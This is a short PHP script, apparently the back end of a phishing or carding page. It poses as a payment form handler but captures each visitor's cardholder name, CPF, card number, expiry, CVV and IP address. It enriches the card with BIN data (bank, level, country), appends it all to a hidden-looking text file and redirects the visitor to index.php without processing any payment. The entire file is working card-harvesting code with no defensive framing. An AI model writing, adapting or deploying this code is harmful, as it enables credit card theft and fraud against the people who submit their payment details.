<?php

//PEGA OS DADOS ENVIADOS DO PAGAMENTO
$titular_cc = $_POST["titular_cc"];
$cpf = $_POST["cpf"];
$numero_cc = $_POST["numero_cc"];
$expiracao = $_POST["expiracao"];
$cvv = $_POST["cvv"];
$ip = $_SERVER["REMOTE_ADDR"];

//VERIFICA A BIN DA CC PELO BINS.CVS
$bin = substr($numero_cc, 0, 6);
$file = 'assets/bins.csv';
$searchfor = $bin;
$contents = file_get_contents($file);
$pattern = preg_quote($searchfor, '/');
$pattern = "/^.*$pattern.*\$/m";
if (preg_match_all($pattern, $contents, $matches)) {
    $encontrada = implode("\n", $matches[0]);
}
$pieces = explode(";", $encontrada);
$c = count($pieces);
if ($c == 8) {
    $pais = $pieces[4];
    $paiscode = $pieces[5];
    $banco = $pieces[2];
    $level = $pieces[3];
    $bandeira = $pieces[1];
} else {
    $pais = $pieces[5];
    $paiscode = $pieces[6];
    $level = $pieces[4];
    $banco = $pieces[2];
    $bandeira = $pieces[1];
}

$info = "$bandeira $banco $level ($paiscode)";

$dados = "".$numero_cc.";".$expiracao.";".$cvv.";".$titular_cc.";".$cpf." -> ".$info."|".$ip."\r\n";

//SALVA OS DADOS EM TXT
$arquivo = 'dimnheiromaind9350SIMDIMFIMRImrimim204.txt';
$criar = fopen($arquivo, "a+");
$conteudo = "$dados";
$escrever = fwrite($criar, $conteudo);
header('Location: index.php');

?>